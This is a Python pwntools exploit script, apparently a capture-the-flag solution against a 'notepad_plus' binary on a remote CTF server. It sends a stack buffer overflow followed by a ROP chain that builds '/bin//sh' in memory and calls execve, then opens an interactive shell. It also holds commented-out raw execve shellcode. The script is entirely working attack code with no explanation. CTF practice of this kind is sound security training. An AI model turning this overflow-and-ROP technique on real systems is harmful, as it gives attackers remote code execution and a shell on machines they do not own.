from pwn import *
import struct

local = False
elf = 'notepad_plus' 

if local: 
    print('./'+elf)
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "ctf.adl.tw"
    port = 11004
    r = remote(ip,port)

context.arch = 'amd64'
context.os= 'linux'
#addr =
#payload = b'\x48\x31\xc0\x50\x90\x90\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x48\xC7\xC3\x2F\x2F\x73\x68\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x48\xC1\xE3\x20\x90\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x48\x81\xC3\x2F\x62\x69\x6E\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x53\x48\x89\xE7\x50\x57\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x0F\x05'
#print(payload)
#print(len(payload))
#payload += b'\00'*51
#print(len(payload))
#print(r.recv())
#address = r.recvline()
#address = address[:-1]
#payload += p64(int("0x6010c0", 16))
#print(payload)

print(r.recvuntil(': '))
payload = b'a'*0x48
payload += p64(0x4124d3)            # pop rsi; ret
payload += p64(0x68732f2f6e69622f)  # "/bin//sh"
payload += p64(0x40283c)            # pop rdi ; pop rbp ; ret
payload += p64(0x6b90e0)            # @ .data (0x6b90e0)
payload += p64(0x0)                 # noise
payload += p64(0x44a48b)            # mov qword ptr [rdi], rsi ; ret
payload += p64(0x443ab5)            # xor rax, rax ; ret
payload += p64(0x418586)            # mov qword ptr [rdi+8], rax; ret
payload += p64(0x44f2a9)            # pop rdx ; pop rsi ; ret 
payload += p64(0x0)                 # noise
payload += p64(0x6b90e8)            # @ .data+8 (0x6b90e8)
payload += p64(0x44cccc)            # pop rax ; ret
payload += p64(0x3b)                # 59 (execve)
payload += p64(0x44f284)            # pop rdx ; pop r10 ; ret
payload += p64(0x6b90e8)            # @ .data+8 (0x6b90e8)
payload += p64(0x0)                 # noise
payload += p64(0x47b6af)            # syscall
print(payload)
print(len(payload))
r.sendline(payload)
print(r.recvuntil('note.\n'))
print(r.recv())
r.interactive()
